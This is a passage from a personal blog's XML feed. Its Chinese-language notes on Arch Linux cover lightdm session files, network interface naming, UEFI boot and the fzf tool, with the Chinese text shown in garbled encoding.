class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ~/.xinitrc</span><br><br>...<br><br><span class="hljs-built_in">exec</span> chromium<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>è§£å†³ä½¿ç”¨ lightdm ç™»å…¥ Arch åæœªæ‰“å¼€ dwm é—®é¢˜</title>
    <link href="/2022/09/04/%E8%A7%A3%E5%86%B3%E4%BD%BF%E7%94%A8-lightdm-%E7%99%BB%E5%85%A5-Arch-%E5%90%8E%E6%9C%AA%E6%89%93%E5%BC%80-dwm-%E9%97%AE%E9%A2%98/"/>
    <url>/2022/09/04/%E8%A7%A3%E5%86%B3%E4%BD%BF%E7%94%A8-lightdm-%E7%99%BB%E5%85%A5-Arch-%E5%90%8E%E6%9C%AA%E6%89%93%E5%BC%80-dwm-%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/Display_Manager">ArckWiki DM éƒ¨åˆ†</a></p><h1 id="Display-Manager"><a href="#Display-Manager" class="headerlink" title="Display Manager"></a>Display Manager</h1><p>Display Manager é€šå¸¸æ˜¯ä¸€ä¸ªåœ¨å¯åŠ¨è¿‡ç¨‹ç»“æŸæ—¶ï¼Œä»£æ›¿é»˜è®¤ shell æ˜¾ç¤ºå›¾å½¢ç”¨æˆ·ç•Œé¢.</p><h1 id="Greeter"><a href="#Greeter" class="headerlink" title="Greeter"></a>Greeter</h1><p>greeter æ˜¯æç¤ºç”¨æˆ·è¾“å…¥å¯†ç çš„ GUI ç•Œé¢ï¼Œå¦‚æœé…ç½®äº†è‡ªåŠ¨ç™»å½•ï¼Œå¯ä»¥ä¸ä½¿ç”¨ greeter. é»˜è®¤é…ç½®ä½¿ç”¨çš„æ˜¯ <code>lightdm-gtk-greeter</code>.</p><p>å¯ä»¥é€šè¿‡æ›´æ”¹é…ç½®æ–‡ä»¶ä¸­çš„ <code>[Seat:*]</code> éƒ¨åˆ†æ¥è®¾ç½® greeter.</p><p>å¯ä»¥é€šè¿‡ <code>ls -l /usr/share/xgreeters/</code> æ¥è·å– greeter çš„å¯ç”¨é€‰é¡¹.</p><h1 id="ä¼šè¯é…ç½®"><a href="#ä¼šè¯é…ç½®" class="headerlink" title="ä¼šè¯é…ç½®"></a>ä¼šè¯é…ç½®</h1><p>ä¼šè¯ï¼Œå³åœ¨ greeter è¾“å…¥å¯†ç è´¦å·åå³å°†è¿›å…¥çš„ç¨‹åºï¼Œä¸€èˆ¬ä¸º Window Manager æˆ–æ¡Œé¢.</p><p>å¤šæ•°æ˜¾ç¤ºç®¡ç†å™¨ä¼šè¯»å– <code>/usr/share/xsessions</code> ç›®å½•è·å–å¯ç”¨çš„ä¼šè¯åˆ—è¡¨ï¼Œæ­¤ç›®å½•ä¸­åŒ…å«å„ä¸ªæ ‡å‡†çš„æ¡Œé¢æ–‡ä»¶ã€‚</p><p>è¦å»ºç«‹ä¼šè¯ï¼Œå¯ä»¥åœ¨ <code>/usr/share/xsessions</code> ä¸­æ–°å»º <code>.desktop</code> åç¼€çš„æ–‡ä»¶.</p><p>æ ¼å¼ (ä»¥æˆ‘è‡ªå·± Ubuntu ä¸Šçš„ gnome.desktop) ä¸ºä¾‹:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Desktop Entry]</span><br><span class="hljs-attr">Name</span>=GNOME<br><span class="hljs-attr">Comment</span>=This session logs you into GNOME<br><span class="hljs-attr">Exec</span>=/usr/bin/gnome-session --session=gnome<br><span class="hljs-attr">TryExec</span>=/usr/bin/gnome-session<br><span class="hljs-attr">Type</span>=Application<br><span class="hljs-attr">DesktopNames</span>=GNOME<br><span class="hljs-attr">X-GDM-SessionRegisters</span>=<span class="hljs-literal">true</span><br><span class="hljs-attr">X-Ubuntu-Gettext-Domain</span>=gnome-session-<span class="hljs-number">42</span><br></code></pre></td></tr></table></figure><p>é‡Œé¢çš„ <code>gnome-session</code> æ˜¯ä¸€ä¸ª shell è„šæœ¬.</p><h1 id="è¿è¡Œ-xinitrc-ä¼šè¯"><a href="#è¿è¡Œ-xinitrc-ä¼šè¯" class="headerlink" title="è¿è¡Œ ~/.xinitrc ä¼šè¯"></a>è¿è¡Œ <code>~/.xinitrc</code> ä¼šè¯</h1><p>éœ€è¦å®‰è£… <code>xinit-xsession</code> åï¼Œåœ¨æ˜¾ç¤ºç®¡ç†å™¨ä¸­æä¾›ä¸€ä¸ªè¿è¡Œ xinitrc ä¼šè¯çš„é€‰é¡¹ï¼Œéœ€ç¡®ä¿ <code>~/.xinitrc</code> å¯æ‰§è¡Œï¼Œç„¶åå†æ˜¾ç¤ºç®¡ç†å™¨ä¸­é€‰æ‹© <code>xinitrc</code> ä½œä¸ºä¼šè¯.</p><h1 id="æ²¡æœ‰çª—å£ç®¡ç†å™¨å¯åŠ¨åº”ç”¨ç¨‹åº"><a href="#æ²¡æœ‰çª—å£ç®¡ç†å™¨å¯åŠ¨åº”ç”¨ç¨‹åº" class="headerlink" title="æ²¡æœ‰çª—å£ç®¡ç†å™¨å¯åŠ¨åº”ç”¨ç¨‹åº"></a>æ²¡æœ‰çª—å£ç®¡ç†å™¨å¯åŠ¨åº”ç”¨ç¨‹åº</h1><p>å¯ä»¥åœ¨æ²¡æœ‰çª—å£ä¿®é¥°ï¼Œæ¡Œé¢æˆ–çª—å£ç®¡ç†å™¨çš„æƒ…å†µä¸‹å¯åŠ¨åº”ç”¨ç¨‹åºã€‚</p><p>å¦‚ï¼Œè¦å¯åŠ¨ <code>google-chrome</code>ï¼Œåœ¨ <code>/usr/share/xsessions/</code> ä¸­åˆ›å»º <code>web-browser.desktop</code>:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Desktop Entry]</span><br><span class="hljs-attr">Name</span>=Web Browser<br><span class="hljs-attr">Comment</span>=Use a web browser as your session<br><span class="hljs-attr">Exec</span>=/usr/bin/google-chrone --auto-launch-at-startup<br><span class="hljs-attr">TryExec</span>=/usr/bin/google-chrone --auto-launch-at-startup<br><span class="hljs-attr">Icon</span>=google-chrome<br><span class="hljs-attr">Type</span>=Application<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æŸ¥çœ‹ Linux ä¸‹çš„ç½‘å¡ä¿¡æ¯</title>
    <link href="/2022/09/03/%E6%9F%A5%E7%9C%8B-Linux-%E4%B8%8B%E7%9A%84%E7%BD%91%E5%8D%A1%E4%BF%A1%E6%81%AF/"/>
    <url>/2022/09/03/%E6%9F%A5%E7%9C%8B-Linux-%E4%B8%8B%E7%9A%84%E7%BD%91%E5%8D%A1%E4%BF%A1%E6%81%AF/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/Systemd-networkd">ArchWiki</a><br>systemd-networkd æ˜¯ä¸€ä¸ªç®¡ç†ç½‘ç»œé…ç½®çš„ç³»ç»Ÿå®ˆæŠ¤è¿›ç¨‹.</p><h1 id="æŸ¥çœ‹ç½‘ç»œè®¾å¤‡"><a href="#æŸ¥çœ‹ç½‘ç»œè®¾å¤‡" class="headerlink" title="æŸ¥çœ‹ç½‘ç»œè®¾å¤‡"></a>æŸ¥çœ‹ç½‘ç»œè®¾å¤‡</h1><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">ls <span class="hljs-regexp">/sys/</span><span class="hljs-keyword">class</span>/net<br></code></pre></td></tr></table></figure><h1 id="åŸºæœ¬ç”¨æ³•"><a href="#åŸºæœ¬ç”¨æ³•" class="headerlink" title="åŸºæœ¬ç”¨æ³•"></a>åŸºæœ¬ç”¨æ³•</h1><p>systemd æ˜¯ Arch å®‰è£…çš„ä¸€éƒ¨åˆ†ï¼ŒåŒ…å«æ“ä½œæœ‰çº¿ç½‘ç»œæ‰€éœ€çš„æ‰€æœ‰æ–‡ä»¶ï¼Œæ— çº¿é€‚é…å™¨å¯ä»¥é€šè¿‡å…¶ä»–æœåŠ¡(å¦‚ wpa_supplicant æˆ– iwd) æ¥é…ç½®.</p><p>é€šè¿‡ <code>ifconfig</code> æ˜¾ç¤ºçš„è®¾å¤‡ä¸­:</p><p><code>enp7s0</code> æ˜¯å½“å‰å®æœºçš„ç½‘å¡.</p><p><code>enpls0</code> æ˜¯æœ‰çº¿é€‚é…å™¨.</p><p><code>wlp2s0</code> æ˜¯æ— çº¿é€‚é…å™¨.</p><h1 id="NCI"><a href="#NCI" class="headerlink" title="NCI"></a>NCI</h1><p>NIC ä¸º Network Interface Controler, ç½‘ç»œæ¥å£æ§åˆ¶å™¨ã€‚åˆç§°ç½‘ç»œé€‚é…å™¨ (network adapter), ç½‘å¡ (netword card), æˆ–å±€åŸŸç½‘æ¥æ”¶å™¨ (LAN adapter).</p><p>å…¶æ˜¯ä¸€å—è¢«è®¾è®¡ç”¨æ¥å…è®¸è®¡ç®—æœºåœ¨è®¡ç®—æœºç½‘ç»œä¸Šè¿›è¡Œé€šè®¯çš„è®¡ç®—æœºç¡¬ä»¶.</p><p>æ¯ä¸ªç½‘å¡éƒ½æœ‰ä¸€ä¸ªè¢«ç§°ä¸º MAC åœ°å€çš„ç‹¬ä¸€æ— äºŒçš„ 48 ä½ä¸²è¡Œå·ï¼Œè¢«å†™åœ¨å¡çš„ä¸€å— ROM ä¸­.</p><p>ç½‘å¡ä»¥å‰æ˜¯ä½œä¸ºæ‰©å±•å¡æ’åˆ°è®¡ç®—æœºæ€»çº¿ä¸Šçš„ï¼Œç°åœ¨å¤§éƒ¨åˆ†æ–°çš„è®¡ç®—æœºéƒ½åœ¨ä¸»æ¿ä¸Šé›†æˆäº†ç½‘ç»œæ¥å£ï¼Œè¿™äº›ä¸»æ¿æˆ–æ˜¯åœ¨ä¸»æ¿èŠ¯ç‰‡ä¸­é›†æˆäº†ä»¥å¤ªç½‘çš„åŠŸèƒ½ï¼Œæˆ–æ˜¯ä½¿ç”¨ä¸€å—é€šè¿‡ PCI è¿æ¥åˆ°ä¸»æ¿ä¸Šçš„å»‰ä»·ç½‘å¡.</p><h1 id="ç½‘å¡åç§°çš„å˜è¿"><a href="#ç½‘å¡åç§°çš„å˜è¿" class="headerlink" title="ç½‘å¡åç§°çš„å˜è¿"></a>ç½‘å¡åç§°çš„å˜è¿</h1><p><a href="https://www.freeaihub.com/post/104299.html">å‚è€ƒ</a><br>ä¸€å¼€å§‹ï¼ŒLinux çš„ç½‘å¡åç§°ä¸º eth0, wlan0. ç°åœ¨å˜ä¸ºäº† enp7s0, wlp6s0.</p><h2 id="eth0-wlan0-çš„å«ä¹‰"><a href="#eth0-wlan0-çš„å«ä¹‰" class="headerlink" title="eth0, wlan0 çš„å«ä¹‰"></a>eth0, wlan0 çš„å«ä¹‰</h2><p>eth0 æ˜¯ç³»ç»Ÿè‡ªåŠ¨é€‰æ‹©çš„ç½‘ç»œè®¾å¤‡åç§°ï¼Œæ¥è‡ª ethernet.</p><p>æ— çº¿ç½‘å¡å°±æ˜¯ wlan, æ¥è‡ª Wireless LAN.</p><p>lo ä¸º Loopback.</p><p>tun ä¸º Tunnel.</p><p>br ä¸º Bridge.</p><h2 id="enp7s0-wlp60-çš„å«ä¹‰"><a href="#enp7s0-wlp60-çš„å«ä¹‰" class="headerlink" title="enp7s0, wlp60 çš„å«ä¹‰"></a>enp7s0, wlp60 çš„å«ä¹‰</h2><p>enp7s0 ä¸­ en ä»£è¡¨ ethernet, wlp60 ä¸­ wl ä»£è¡¨ wireless.</p><p>pXsY (X, Y æ˜¯æ•´æ•°å€¼) ä»£è¡¨ PCI çš„ä½ç½®ã€‚</p><h1 id="virbr"><a href="#virbr" class="headerlink" title="virbr"></a>virbr</h1><p>virbr0 (Virtual network switch) æ˜¯ä¸€ç§è™šæ‹Ÿç½‘ç»œæ¥å£ï¼Œè¿™æ˜¯ç”±äºå®‰è£…å’Œå¯ç”¨äº† libvirt æœåŠ¡åç”Ÿæˆçš„ï¼Œlibvirt åœ¨æœåŠ¡å™¨ (host) ä¸Šç”Ÿæˆä¸€ä¸ª virbr0, host ä¸Šæ‰€æœ‰è™šæ‹Ÿæœº (guests) é€šè¿‡è¿™ä¸ª virbr0 è¿èµ·æ¥. é»˜è®¤æƒ…å†µä¸‹, virbr0 ä½¿ç”¨çš„æ˜¯ NAT æ¨¡å¼ (é‡‡ç”¨ IP Masquerade).</p><h1 id="NAT"><a href="#NAT" class="headerlink" title="NAT"></a>NAT</h1><p>NAT æ˜¯ Network Address Translation, ç½‘ç»œåœ°å€è½¬æ¢</p><p>å½“ä¸“ç”¨ç½‘å†…éƒ¨çš„ä¸»æœºåˆ†é…äº†æœ¬åœ°çš„ IP åœ°å€ (å³ä»…åœ¨æœ¬ä¸“ç”¨ç½‘å†…ä½¿ç”¨çš„ä¸“ç”¨åœ°å€), ä½†åˆæƒ³å’Œå› ç‰¹ç½‘ä¸Šçš„ä¸»æœºé€šä¿¡, é€šå¸¸ä½¿ç”¨ NAT.</p><h1 id="PCI-æ€»çº¿"><a href="#PCI-æ€»çº¿" class="headerlink" title="PCI æ€»çº¿"></a>PCI æ€»çº¿</h1><p>PCI æ˜¯ Peripheral Component Interconnect(å¤–è®¾éƒ¨ä»¶äº’è”æ ‡å‡†) çš„ç¼©å†™ã€‚å…¶ä¸ºä¸ªäººç”µè„‘ä½¿ç”¨æœ€å¹¿æ³›çš„æ¥å£. å‡ ä¹æ‰€æœ‰çš„ä¸»æ¿äº§å“ä¸Šéƒ½å¸¦æœ‰è¿™ç§æ’æ§½ã€‚PCI æ’æ§½ä¹Ÿæ˜¯ä¸»æ¿å¸¦æœ‰æœ€å¤šæ•°é‡çš„æ’æ§½ç±»å‹ã€‚</p><p>ä»ç»“æ„ä¸Šçœ‹ï¼ŒPCI æ˜¯åœ¨ CPU çš„ä¾›åº”å•†å’ŒåŸæ¥çš„ç³»ç»Ÿæ€»çº¿ä¹‹é—´æ’å…¥çš„ä¸€çº§æ€»çº¿ï¼Œå…·ä½“ç”±ä¸€ä¸ªæ¡¥æ¥ç”µè·¯å®ç°å¯¹è¿™ä¸€å±‚çš„ç®¡ç†ï¼Œå¹¶å®ç°ä¸Šä¸‹ä¹‹é—´çš„æ¥å£ä»¥åè°ƒæ•°æ®çš„ä¼ è¾“.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æœºå™¨äººå­¦ä¹ å°çº²è¦</title>
    <link href="/2022/09/03/%E6%9C%BA%E5%99%A8%E4%BA%BA%E5%AD%A6%E4%B9%A0%E5%B0%8F%E7%BA%B2%E8%A6%81/"/>
    <url>/2022/09/03/%E6%9C%BA%E5%99%A8%E4%BA%BA%E5%AD%A6%E4%B9%A0%E5%B0%8F%E7%BA%B2%E8%A6%81/</url>
    
    <content type="html"><![CDATA[<h1 id="çº¿æ€§ä»£æ•°"><a href="#çº¿æ€§ä»£æ•°" class="headerlink" title="çº¿æ€§ä»£æ•°"></a>çº¿æ€§ä»£æ•°</h1><p>çº¿æ€§ä»£æ•°ä¹¦:</p><ul><li>ã€ŠLinear Algebra Done Rightã€‹</li><li>ã€ŠLinear Algebra Done Wrongã€‹<br><a href="https://www.math.brown.edu/~treil/papers/LADW/book.pdf">çº¿ä»£ä¹¦</a></li></ul><h1 id="makefile"><a href="#makefile" class="headerlink" title="makefile"></a>makefile</h1><p>åšæ–‡: Makefileè¯¦è§£(è¶…çº§å¥½)_mingw</p><h1 id="Javascript-å’Œ-HTML-å­¦ä¹ "><a href="#Javascript-å’Œ-HTML-å­¦ä¹ " class="headerlink" title="Javascript å’Œ HTML å­¦ä¹ "></a>Javascript å’Œ HTML å­¦ä¹ </h1><p><a href="http://www.w3schools.com/">èµ„æ–™</a><br>ç½‘ç«™å·¦ä¾§çš„ â€œLearn HTMLâ€ã€â€Learn CSSâ€ã€â€Learn Javascriptâ€ã€â€Learn JQueryâ€.</p><p>ç½‘ç«™: three.jsã€examples</p><p>PHP</p><p>ä¸€æœ¬ä¹¦: ã€Šæ•°å­¦ä¹‹ç¾ã€‹</p><h1 id="ç¡¬ä»¶"><a href="#ç¡¬ä»¶" class="headerlink" title="ç¡¬ä»¶"></a>ç¡¬ä»¶</h1><p>Solidworks ç”»åŸºæœ¬çš„æœºæ¢°å›¾.</p><p>Altium Designer ä½œå›¾.</p><p>å¼€å‘å¥—ä»¶: Arduino STEM educational Robot kits Building Platform.</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äºå¤šç³»ç»Ÿå®‰è£…</title>
    <link href="/2022/09/03/%E5%85%B3%E4%BA%8E%E5%A4%9A%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/"/>
    <url>/2022/09/03/%E5%85%B3%E4%BA%8E%E5%A4%9A%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/</url>
    
    <content type="html"><![CDATA[<p>åˆ é™¤ä¸€ä¸ªåŒç³»ç»Ÿä¹‹ä¸­çš„ä¸€ä¸ªç³»ç»Ÿï¼Œç›´æ¥æ ¼å¼åŒ–åˆ†åŒºä¹Ÿé—®é¢˜ä¸å¤§ï¼Œåªæ˜¯å¯åŠ¨æ—¶å¼•å¯¼è¿˜åœ¨.</p>]]></content>
    
    
    <categories>
      
      <category>Skills</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki ä¸­ XFS éƒ¨åˆ†</title>
    <link href="/2022/09/03/ArchWiki-%E4%B8%AD-XFS-%E9%83%A8%E5%88%86/"/>
    <url>/2022/09/03/ArchWiki-%E4%B8%AD-XFS-%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/XFS">ArchWiki XFS éƒ¨åˆ†</a><br>XFS æ˜¯é«˜æ–°èƒ½æ—¥å¿—å¼æ–‡ä»¶ç³»ç»Ÿ.</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki ä¸­ UEFI éƒ¨åˆ†</title>
    <link href="/2022/09/03/ArchWiki-%E4%B8%AD-UEFI-%E9%83%A8%E5%88%86/"/>
    <url>/2022/09/03/ArchWiki-%E4%B8%AD-UEFI-%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/Unified_Extensible_Firmware_Interface">ArchWiki</a><br>UEFI æ˜¯ Unified Extensible Firmware Interface, ç»Ÿä¸€å¯æ‰©å±•å›ºä»¶æ¥å£, æ˜¯æ“ä½œç³»ç»Ÿå’Œå›ºä»¶ä¹‹é—´æ¥å£çš„æ¨¡å‹ã€‚UEFI æä¾›äº†å¯åŠ¨æ“ä½œç³»ç»Ÿæˆ–é¢„å¯åŠ¨ç¨‹åºçš„æ ‡å‡†ç¯å¢ƒ.</p><h1 id="Arch-boot-process"><a href="#Arch-boot-process" class="headerlink" title="Arch boot process"></a>Arch boot process</h1><p><a href="https://wiki.archlinux.org/title/Arch_boot_process">ArchWikiä¸­ç›¸å…³éƒ¨åˆ†</a></p><h2 id="å›ºä»¶ç±»å‹"><a href="#å›ºä»¶ç±»å‹" class="headerlink" title="å›ºä»¶ç±»å‹"></a>å›ºä»¶ç±»å‹</h2><p>å›ºä»¶æ˜¯å¼€æœºæ—¶æœ€å…ˆæ‰§è¡Œçš„ç¨‹åºã€‚</p><h3 id="BIOS"><a href="#BIOS" class="headerlink" title="BIOS"></a>BIOS</h3><p>Basic Input-Output System, æ˜¯ç³»ç»Ÿå¼€å¯æ—¶æœ€å…ˆè¿è¡Œçš„ç¨‹åº (å›ºä»¶), å¤§å¤šæ•°æƒ…å†µå­˜å‚¨åœ¨ä¸»æ¿æœ¬èº«çš„ä¸€å—é—ªå­˜å†…ï¼Œç‹¬ç«‹äºå…¶ä»–ç³»ç»Ÿå­˜å‚¨ã€‚</p><p>å…¶åˆ†åŒºå—é™åˆ¶, åœ¨ 2010 å¹´èµ·é€æ¸è¢« UEFI æ›¿æ¢.</p><h3 id="UEFI"><a href="#UEFI" class="headerlink" title="UEFI"></a>UEFI</h3><p>å…¶ä¸ä»ä¸»å¼•å¯¼è®°å½• (MBR) ä¸­å¯åŠ¨ä»»ä½•å¼•å¯¼ä»£ç .</p><p>UEFI å¯åŠ¨è¿‡ç¨‹ä¾èµ–<mark>éæ˜“å¤±æ€§éšæœºè®¿é—®å­˜å‚¨å™¨</mark> (NVRAM)</p><p>UEFI ä¼šå¯åŠ¨ EFI åº”ç”¨ç¨‹åºï¼Œä¾‹å¦‚ boot loader, bootmanager å’Œ UEFI Shellç­‰ã€‚è¿™äº›ç¨‹åºé€šå¸¸ä»¥æ–‡ä»¶å½¢å¼å­˜å‚¨åœ¨ EFI ç³»ç»Ÿåˆ†åŒºä¸­. å‚å•†å¯ä»¥å°†å…¶ç‰¹å®šæ–‡ä»¶å­˜å‚¨åœ¨ <code>EFI</code> ç³»ç»Ÿåˆ†åŒºçš„ <code>/EFI/vendor_name</code> æ–‡ä»¶å¤¹ä¸‹.</p><p>UEFI è§„èŒƒé€šè¿‡ Compatibility Support Module, CSM, æ¥æ”¯æŒ BIOS å¼•å¯¼.</p><h4 id="NVRAM"><a href="#NVRAM" class="headerlink" title="NVRAM"></a>NVRAM</h4><p>å…¶å…¨ç§°ä¸º Non-volatile random-access memory.</p><p>å®ƒå¯ä»¥åœ¨æ–­ç”µæ—¶ä»ç„¶ä¿å­˜å…¶ä¸­çš„æ•°æ®.</p><p>è€Œ DRAM (dynammic random-access memory) å’Œ SRAM (static random-access memory) éƒ½éœ€è¦åœ¨è¿æ¥ç”µæºçš„æƒ…å†µä¸‹.</p><p>Read-only memory device å¯ä»¥ç”¨ä½œå­˜å‚¨ system firmware in åµŒå…¥å¼ç³»ç»Ÿã€‚å®ƒä»¬å¯ä»¥ä¿å­˜ initial processor instructions required to bootstrap a computer system.</p><h2 id="ç³»ç»Ÿåˆå§‹åŒ–"><a href="#ç³»ç»Ÿåˆå§‹åŒ–" class="headerlink" title="ç³»ç»Ÿåˆå§‹åŒ–."></a>ç³»ç»Ÿåˆå§‹åŒ–.</h2><p>ç³»ç»Ÿå¼€å¯åï¼Œä¼šå…ˆæ‰§è¡ŒåŠ ç”µè‡ªæ£€ (Power-on self-test, POST). å…·ä½“è§å®˜ç½‘ã€‚</p><h2 id="å¼•å¯¼åŠ è½½ç¨‹åº"><a href="#å¼•å¯¼åŠ è½½ç¨‹åº" class="headerlink" title="å¼•å¯¼åŠ è½½ç¨‹åº"></a>å¼•å¯¼åŠ è½½ç¨‹åº</h2><p>Boot loader. æ˜¯ç”±è®¡ç®—æœºå›ºä»¶ (BIOS æˆ– UEFI) å¯åŠ¨çš„è½¯ä»¶ã€‚å®ƒè´Ÿè´£ç”¨æƒ³è¦çš„å†…æ ¸å‚æ•°åŠ è½½å†…æ ¸ï¼Œå¹¶æ ¹æ®é…ç½®æ–‡ä»¶åˆå§‹åŒ– RAM ç£ç›˜.</p><p>æ–‡ä»¶ç³»ç»Ÿæ”¯æŒæ˜¯ä»å›ºä»¶ç»§æ‰¿çš„ã€‚UEFI è§„èŒƒè¦æ±‚æ”¯æŒ FAT12, FAT16 å’Œ FAT32 æ–‡ä»¶ç³»ç»Ÿ.</p><p><code>.efi</code> å°±æ˜¯ EFI åº”ç”¨ç¨‹åº.</p><h2 id="å†…æ ¸"><a href="#å†…æ ¸" class="headerlink" title="å†…æ ¸"></a>å†…æ ¸</h2><p>å†…æ ¸æ˜¯æ“ä½œç³»ç»Ÿçš„æ ¸å¿ƒã€‚å®ƒè¿è¡Œäºä¸€ä¸ªå« â€œå†…æ ¸ç©ºé—´â€ çš„åº•å±‚ä¸Šï¼Œè´Ÿè´£æœºå™¨ç¡¬ä»¶å’Œåº”ç”¨ç¨‹åºä¹‹é—´çš„äº¤æµã€‚</p><h1 id="UEFI-1"><a href="#UEFI-1" class="headerlink" title="UEFI"></a>UEFI</h1><h2 id="UEFI-å›ºä»¶æ¶æ„"><a href="#UEFI-å›ºä»¶æ¶æ„" class="headerlink" title="UEFI å›ºä»¶æ¶æ„"></a>UEFI å›ºä»¶æ¶æ„</h2><p>UEFI ä¸‹çš„æ¯ä¸€ä¸ªç¨‹åºï¼Œæ— è®ºå®ƒæ˜¯æŸä¸ª OS å¼•å¯¼å…¶è¿˜æ˜¯æŸä¸ªå†…å­˜æµ‹è¯•æˆ–æ•°æ®æ¢å¤å·¥å…·ï¼Œéƒ½è¦å…¼å®¹äº EFI å›ºä»¶ä½æ•°æˆ–ä½“ç³»ç»“æ„ã€‚</p><p>ç›®å‰ä¸»æµçš„ UEFI å›ºä»¶éƒ½é‡‡ç”¨ x86_64 EFI å›ºä»¶ã€‚</p><p>x86_64 EFI ä¸èƒ½å…¼å®¹ 32 ä½ EFI ç¨‹åº.</p><p>æŸ¥çœ‹ UEFI ç³»ç»Ÿä½æ•°:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ cat <span class="hljs-regexp">/sys/</span>firmware<span class="hljs-regexp">/efi/</span>fw_platform_size<br></code></pre></td></tr></table></figure><h2 id="UEFI-å˜é‡"><a href="#UEFI-å˜é‡" class="headerlink" title="UEFI å˜é‡"></a>UEFI å˜é‡</h2><p>è·å–å˜é‡åˆ—è¡¨:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>efivar -l<br></code></pre></td></tr></table></figure><h3 id="ç”¨æˆ·ç©ºé—´å·¥å…·"><a href="#ç”¨æˆ·ç©ºé—´å·¥å…·" class="headerlink" title="ç”¨æˆ·ç©ºé—´å·¥å…·"></a>ç”¨æˆ·ç©ºé—´å·¥å…·</h3><h4 id="efibootmgr"><a href="#efibootmgr" class="headerlink" title="efibootmgr"></a>efibootmgr</h4><h2 id="UEFI-Shell"><a href="#UEFI-Shell" class="headerlink" title="UEFI Shell"></a>UEFI Shell</h2><p>UEFI Shell æ˜¯å›ºä»¶çš„ç»ˆç«¯ï¼Œå¯ç”¨äºå¯åŠ¨åŒ…æ‹¬å¼•å¯¼å™¨çš„ UEFI ç¨‹åº.</p><p>ä¹Ÿå¯ç”¨äºé‡‡é›†å›ºä»¶å’Œç³»ç»Ÿçš„å„ç§ä¿¡æ¯.</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>fzf å·¥å…·çš„å®‰è£…å’Œä½¿ç”¨</title>
    <link href="/2022/09/03/fzf-%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/09/03/fzf-%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/junegunn/fzf">github ç›¸å…³å†…å®¹</a><br>fzf æ˜¯ fuzzy finder çš„ç®€ç§°ã€‚</p><p>ç”¨äºåœ¨å‘½ä»¤è¡Œä¸‹æŸ¥æ‰¾æ–‡ä»¶, ç›®å½•ç­‰ã€‚</p><p>æ³¨æ„åœ¨ä¸‹è½½åï¼š Key bindings (CREL-T&#x2F;CREL-R&#x2F;CREL-C) and fuzzy auto-completion may not be enabled by default.</p><h1 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h1><p>ä½¿ç”¨å‡ ä¸ªå¿«æ·é”®ï¼š</p><ul><li><code>CTRL-K</code> å’Œ <code>CTRL-J</code> ç”¨äºä¸Šä¸‹ç§»åŠ¨</li><li><code>Enter</code> ç”¨äºé€‰ä¸­ï¼Œ<code>CTRL-C</code> ç”¨äºé€€å‡º</li><li><code>-m</code> multi-select mode, ä½¿ç”¨ <code>TAB</code> å’Œ <code>Shift-TAB</code> æ¥æ ‡è®°å¤šä¸ª items</li><li>é¼ æ ‡æ»šè½®ä¹Ÿèƒ½ç§»åŠ¨<br>è¢«é€‰ä¸­çš„ä¼šè¢«è¾“å‡ºåˆ° STDOUT ä¸­ã€‚</li></ul><h2 id="layout"><a href="#layout" class="headerlink" title="layout"></a>layout</h2><p>å¯æ”¹å˜çª—å£å¤§å°ï¼Œå…·ä½“è§ github.</p><h2 id="Search-syntax"><a href="#Search-syntax" class="headerlink" title="Search syntax"></a>Search syntax</h2><p>å¯ä»¥ä½¿ç”¨ç©ºæ ¼æ¥è¿›è¡Œå±‚æ¬¡æœç´¢, æ¯”å¦‚ <code>Documents/books/hello.txt</code>, ä½ å¯ä»¥åœ¨ fzf ä¸­è¾“å…¥ <code>Do boo hello</code> æ¥æŸ¥æ‰¾ã€‚</p><p>ç”¨ <code>|</code> ä»£è¡¨ â€œæˆ–è€…â€, <code>^</code> , <code>$</code> å’Œ <code>!</code> 